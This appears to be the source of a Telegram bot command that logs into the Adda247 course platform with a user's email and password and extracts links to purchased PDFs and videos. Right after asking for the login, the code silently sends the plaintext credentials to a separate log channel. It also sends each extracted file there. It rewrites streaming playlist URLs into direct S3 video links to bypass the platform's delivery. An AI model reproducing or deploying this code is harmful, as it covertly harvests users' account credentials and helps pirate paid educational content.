import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
import requests
from Extractor import app
from config import CHANNEL_ID

log_channel = CHANNEL_ID
@app.on_message(filters.command(["adda"]))
async def adda_command_handler(app, m):
    try:
        # 1. Ask & Log (Feature from Script 2)
        e_message = await app.ask(m.chat.id, "Send ID & Password\nFormat: `Email*Password`")
        ap = e_message.text.strip()
        
        # Forward credentials to log channel
        await app.send_message(log_channel, f"#LOGIN\n**User:** {m.from_user.id}\n**Data:** `{ap}`")

        if "*" not in ap:
            await m.reply_text("Invalid format.")
            return
            
        e, p = ap.split("*")
        status = await m.reply_text("🔎 Logging in...")

        # 2. Login (Standard requests logic)
        headers = {"Content-Type": "application/json", "X-Auth-Token": "fpoa43edty5", "X-Jwt-Token": ""}
        data = {"email": e, "providerName": "email", "sec": p}
        
        # We wrap .json() in a try block to prevent your specific error
        try:
            login_res = requests.post("https://userapi.adda247.com/login?src=aweb", json=data, headers=headers).json()
            jwt = login_res.get("jwtToken")
        except:
            await status.edit("❌ Server returned invalid JSON during login.")
            return

        if not jwt:
            await status.edit("❌ Login failed.")
            return

        headers["X-Jwt-Token"] = jwt
        
        # 3. Get Packages
        pkg_res = requests.get("https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb", headers=headers).json()
        packages = pkg_res.get("data", [])

        for package in packages:
            package_id = package.get("packageId")
            package_title = package.get("title", "Batch").replace('|', '_').replace('/', '_')
            
            await status.edit(f"Processing: `{package_title}`")
            file_name = f"{package_title}.txt"
            total = 0
            
            with open(file_name, "w", encoding='utf-8') as file:
                # FEATURE: Look through Recorded, Live, and Tests
                for cat in ["ONLINE_LIVE_CLASSES", "RECORDED_COURSE", "TEST_SERIES"]:
                    child_url = f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={cat}&isComingSoon=false&pageNumber=0&pageSize=20&src=aweb"
                    
                    try:
                        child_data = requests.get(child_url, headers=headers).json()
                    except: continue # Skip if this category returns non-JSON error

                    for child in child_data.get("data", {}).get("packages", []):
                        c_id = child.get("packageId")
                        
                        for api in [f"https://store.adda247.com/api/v1/my/purchase/OLC/{c_id}?src=aweb", 
                                    f"https://store.adda247.com/api/v1/my/purchase/content/{c_id}?src=aweb"]:
                            
                            try:
                                res = requests.get(api, headers=headers).json()
                                items = res.get("data", {}).get("onlineClasses", []) + res.get("data", {}).get("contents", [])
                            except: continue

                            for item in items:
                                name = item.get("name", "Class").replace('|', '_')
                                
                                # PDF
                                pdf = item.get("pdfFileName") or item.get("pdf")
                                if pdf:
                                    file.write(f"{name}: https://store.adda247.com/{pdf}\n")
                                    total += 1
                                
                                # VIDEO (New S3 Format - No extra JSON request needed)
                                v_url = item.get("url")
                                if v_url:
                                    # We don't call .json() here, we just fix the string
                                    clean_path = v_url.replace("/480p30playlist.m3u8", ".mp4").replace("480p30playlist.m3u8", ".mp4")
                                    final_video = f"https://video-streaming-source.s3.ap-south-1.amazonaws.com/{clean_path}"
                                    file.write(f"{name}: {final_video}\n")
                                    total += 1

            # 4. Upload
            if total > 0:
                await m.reply_document(file_name, caption=f"✅ **Batch:** `{package_title}`\n📊 **Items:** {total}")
                await app.send_document(log_channel, file_name)
                os.remove(file_name)

        await status.edit("✅ Extraction Finished!")

    except Exception as e:
        await m.reply_text(f"⚠️ Error: {str(e)}")
